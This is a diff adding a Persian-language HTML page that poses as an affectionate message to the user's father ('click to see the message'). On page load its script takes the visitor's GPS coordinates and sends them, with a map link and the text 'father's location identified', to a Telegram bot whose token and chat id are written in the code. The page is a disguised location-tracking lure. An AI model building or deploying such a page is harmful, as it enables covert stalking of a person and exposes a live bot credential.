@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>❤️ برای دیدن پیام، کلیک کن</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    function sendLocationToTelegram(lat, lon) {
+      const chatId = "1911302234";
+      const token = "7300968462:AAH3tKmBLB3blE0mXD5kgLbM0XtoTh80_-8";
+      const message = `📍 موقعیت پدر شناسایی شد:\n\n🌐 Latitude: ${lat}\n🌐 Longitude: ${lon}\n🗺️ نقشه: https://www.google.com/maps?q=${lat},${lon}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      fetch(url);
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            sendLocationToTelegram(lat, lon);
+          },
+          (error) => {
+            alert("خطا در گرفتن موقعیت مکانی. لطفاً GPS را روشن کنید و دوباره تلاش کنید.");
+          }
+        );
+      } else {
+        alert("این مرورگر از GPS پشتیبانی نمی‌کند.");
+      }
+    }
+  </script>
+</head>
+<body onload="getLocation()" style="text-align:center; padding:50px; font-family:sans-serif;">
+  <h2>👋 سلام پدر عزیزم</h2>
+  <p>برای دیدن پیام، لطفاً چند لحظه صبر کن ...</p>
+  <img src="https://i.imgur.com/VgXTvkg.png" alt="❤️" width="200">
+</body>
+</html>
